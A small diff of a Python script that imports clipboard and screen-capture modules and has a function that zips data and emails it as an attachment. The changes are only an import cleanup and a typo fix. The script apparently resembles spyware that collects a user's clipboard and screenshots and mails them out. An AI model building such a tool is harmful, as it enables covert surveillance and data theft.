@@ -9,7 +9,7 @@ import pyperclip
 from PIL import ImageGrab
 import threading
 # modules for sending email
-import smtplib, ssl
+import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -126,7 +126,7 @@ def send_email(subject, to, body, close=False):
             zip_part = MIMEBase("application", "zip")
             zip_part.set_payload(z.read())
         
-        # encodeing the zip file in ASCII characters so the email can send it
+        # encoding the zip file in ASCII characters so the email can send it
         encoders.encode_base64(zip_part)
         zip_part.add_header("Content-Disposition", "attachment", filename="temp.zip")
         email.attach(zip_part)
